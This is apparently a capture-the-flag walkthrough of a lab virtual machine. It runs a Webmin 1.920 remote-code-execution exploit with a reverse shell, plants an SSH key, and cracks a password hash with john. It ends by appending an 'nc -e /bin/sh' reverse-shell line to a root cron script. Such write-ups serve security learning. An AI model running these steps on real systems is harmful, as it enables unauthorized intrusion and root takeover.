We use the tools called netdiscover scan hosts, we found the 192.168.0.106 is our target virtualbox host ip.

By googling webmin 1.920, we can find there exists a Remote code Execution Attack.We can download from 

[https://www.exploit-db.com/exploits/47293](https://www.exploit-db.com/exploits/47293)

run this exploit bash, we can find this webmin system is vulnerable.

so we use instead his cmd with our reverse shell.

We nc listen 2333,  run this exploit , we can connect to this host.

Now we go into nezuko home directory, we found a .ssh directory and a nezuko.txt(flag)

<img src="images/Screen Shot 2019-09-16 at 8.30.37 PM.png" alt="Screen Shot 2019-09-16 at 8.30.37 PM"  />

We put our authorized_keys upload, so that we can use shell better.

<img src="images/Screen Shot 2019-09-16 at 8.33.22 PM.png" alt="Screen Shot 2019-09-16 at 8.33.22 PM"  />

we go into from_zenitsu directory, found root may log in this directory.
<img src="images/Screen Shot 2019-09-16 at 8.36.06 PM.png" alt="Screen Shot 2019-09-16 at 8.36.06 PM"  />

emmm......

now we return /home directory, we found zenitsu, go into zenitsu home directory, found zenitsu.txt（flag）

<img src="images/Screen Shot 2019-09-16 at 8.39.56 PM.png" alt="Screen Shot 2019-09-16 at 8.39.56 PM"  />

luckily, we found a send_message_to_nezuko.sh, have group zenitsu:root privilege.
<img src="images/Screen Shot 2019-09-16 at 8.42.39 PM.png" alt="Screen Shot 2019-09-16 at 8.42.39 PM"  />

So the scripts may be run by crontab in user called root .

poorly,  we don't own the zenitsu privilege, so we cat /ect/passwd, found his password hash.

So we use john to brute force this password, the password is meowmeow.
<img src="images/Screen Shot 2019-09-16 at 8.50.54 PM.png" alt="Screen Shot 2019-09-16 at 8.50.54 PM"  />


We ssh login user zenitsu with his password. otherwise, zenitsu is not allowed to login in ssh, so we

su - zenitsu, successfully.

<img src="images/Screen Shot 2019-09-16 at 8.53.39 PM.png" alt="Screen Shot 2019-09-16 at 8.53.39 PM"  />


so we `echo 'nc -e /bin/sh 192.168.0.105 2334' >> send_message_to_nezuko.sh`

wait a little time , we can connect from user root.

that's all, thanks for reading ^_^
